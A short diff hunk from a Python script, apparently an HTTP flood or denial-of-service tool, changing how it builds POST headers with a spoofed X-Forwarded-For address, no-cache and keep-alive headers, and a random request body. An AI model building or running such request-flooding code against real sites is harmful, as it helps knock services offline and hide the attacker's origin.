@@ -223,7 +223,7 @@ def Headers(method):
         connection = "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        data = str(random._urandom(0.001))
+        data = str(random._urandom(0))
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
         header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
     elif method == "hit":
